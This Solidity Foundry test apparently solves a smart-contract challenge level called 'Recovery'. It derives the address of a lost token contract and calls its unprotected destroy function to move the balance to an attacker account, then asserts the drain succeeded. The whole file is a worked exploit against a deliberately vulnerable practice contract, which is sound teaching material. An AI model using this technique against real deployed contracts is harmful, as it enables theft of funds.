// SPDX-License-Identifier: MIT

pragma solidity ^0.8.17;

import "forge-std/Test.sol";
import {Recovery} from "src/levels/Recovery.sol";
import {RecoveryFactory} from "src/levels/RecoveryFactory.sol";

contract RecoveryTest is Test {
    error CallFailed();

    Recovery private recovery;
    RecoveryFactory private factory;
    address attacker = makeAddr("attacker");

    function setUp() external {
        factory = new RecoveryFactory();

        hoax(attacker);
        address recoveryAddr = factory.createInstance{value: 0.001 ether}(
            attacker
        );
        recovery = Recovery(recoveryAddr);
    }

    // https://ethereum.stackexchange.com/questions/760/how-is-the-address-of-an-ethereum-contract-computed
    function test_RecoveryHack() external {
        address simpleTokenAddress = address(
            uint160(
                uint256(
                    keccak256(
                        abi.encodePacked(
                            bytes1(0xd6),
                            bytes1(0x94),
                            address(recovery),
                            bytes1(0x01)
                        )
                    )
                )
            )
        );

        assertTrue(
            simpleTokenAddress.balance > 0,
            "Computed address is not correct. Balance should be greater than 0."
        );

        uint256 attackerBalanceBefore = attacker.balance;

        vm.startPrank(attacker, attacker);

        (bool success, ) = simpleTokenAddress.call(
            abi.encodeWithSignature("destroy(address)", attacker)
        );

        if (!success) revert CallFailed();

        uint256 simpleTokenBalanceAfter = simpleTokenAddress.balance;
        uint256 attackerBalanceAfter = attacker.balance;

        assertEq(
            simpleTokenBalanceAfter,
            0,
            "Failed to drain SimpleToken contract"
        );

        assertEq(
            attackerBalanceAfter - attackerBalanceBefore,
            0.001 ether,
            "Did not get full amount"
        );

        success = factory.validateInstance(
            payable(address(recovery)),
            attacker
        );

        assertTrue(success, "Failed to validate the instance");
        vm.stopPrank();
    }
}
